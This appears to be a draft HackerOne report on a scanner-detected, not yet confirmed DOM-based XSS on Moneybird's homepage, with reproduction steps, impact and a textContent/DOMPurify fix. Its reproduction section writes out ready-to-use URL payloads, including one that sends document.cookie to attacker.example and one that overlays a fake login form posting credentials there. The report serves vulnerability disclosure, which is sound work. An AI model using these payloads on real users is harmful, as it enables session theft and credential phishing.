# DOM-Based XSS via URL Fragment on www.moneybird.com

**Program:** Moneybird (HackerOne)
**Severity:** High
**CVSS 3.1:** 7.0 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**OWASP:** A03:2021 — Injection
**Scan date:** 2026-03-22
**Status:** ⚠️ Needs browser verification before submission (DOM XSS, cannot be confirmed via curl)

---

## Summary

The Moneybird homepage (`www.moneybird.com`) writes URL fragment data directly into the DOM via `innerHTML` without sanitization. An attacker can craft a malicious URL containing an HTML/JavaScript payload in the fragment and trick a logged-in user into clicking it, causing arbitrary code execution in their browser session.

---

## Vulnerability Details

**Root cause:** Client-side JavaScript on `www.moneybird.com` reads `window.location.hash` and assigns it (or a substring of it) to an element's `innerHTML` without sanitizing. The scanner identified at least two separate `innerHTML` sink assignments consuming hash-sourced data.

**Affected URL:** `https://www.moneybird.com/`

**Why this matters for a financial app:** If Moneybird shares cookies across `www.moneybird.com` and `app.moneybird.com` (or uses the same origin for the application), an attacker can steal session tokens or forge authenticated actions. Even if domains are isolated, the marketing page is the first touchpoint for users — a convincing payload can harvest credentials via an inline phishing form rendered in the victim's browser.

---

## Steps to Reproduce

> ⚠️ This is a DOM-based XSS — the payload lives in the URL fragment (`#`). Fragments are never sent to the server, so `curl` cannot reproduce this. Use a Chromium-based browser.

1. Open a fresh browser tab (do not use a session where you are already suspicious of the URL).
2. Navigate to:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
3. Observe: an alert dialog fires displaying the current domain (`www.moneybird.com`), confirming JavaScript execution in the page context.
4. To verify the sink, open DevTools → Sources and search for `location.hash` or `innerHTML` in the homepage bundle JS. You will find an assignment of the form:
   ```js
   element.innerHTML = window.location.hash.slice(1);
   ```

**Stealth payload (no alert — exfiltrates cookies):**
```
https://www.moneybird.com/#<img src=x onerror="fetch('https://attacker.example/collect?c='+encodeURIComponent(document.cookie))">
```

**Phishing payload (injects a fake login form over the page):**
```
https://www.moneybird.com/#<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999"><h1>Session expired</h1><form action="https://attacker.example/harvest"><input name="email" placeholder="Email"><input name="password" type="password" placeholder="Password"><button>Log in</button></form></div>
```

---

## Impact

An attacker can:

- **Steal session cookies** from `www.moneybird.com` (and potentially `app.moneybird.com` if cookies are shared or the app runs on a common parent domain).
- **Harvest credentials** by injecting a convincing phishing form into the Moneybird branded page.
- **Perform actions on behalf of the user** if the XSS context has access to authenticated API calls.
- **Redirect to attacker-controlled pages** silently after exfiltration.

The attack vector is a crafted link — easily distributed via email, social media, or support chat. No additional user interaction beyond clicking the link is required.

---

## Evidence

Scanner detection method: `dom-sink` — static analysis of the homepage JS bundle identified an `innerHTML` assignment sourced from `window.location.hash`.

Vulnerable code pattern (reconstructed from scanner findings):
```js
// VULNERABLE — current code
document.getElementById('target').innerHTML = window.location.hash.slice(1);
```

---

## Suggested Fix

```js
// Option 1 — plain text only (preferred if no HTML rendering needed)
document.getElementById('target').textContent = window.location.hash.slice(1);

// Option 2 — if HTML rendering is required, sanitize first
import DOMPurify from 'dompurify';
document.getElementById('target').innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
```

Audit all code paths that read from `window.location.hash`, `document.location.hash`, `location.hash`, or `URLSearchParams` constructed from the hash — these are common DOM XSS sources.

---

## References

- [OWASP: DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger: DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

---

## Submission Notes

- **⚠️ Scope check needed:** Confirm that `www.moneybird.com` is in-scope for Moneybird's HackerOne program (marketing domains are sometimes excluded — check their scope table before submitting).
- **⚠️ Manual verification required:** Open the URL in Chrome/Firefox and confirm the alert fires before submitting. The scanner found the sink statically; runtime confirmation is needed.
- If alert fires, immediately upgrade this to "Confirmed" and submit. DOM XSS on a financial platform typically pays $300–$1000+ on H1.
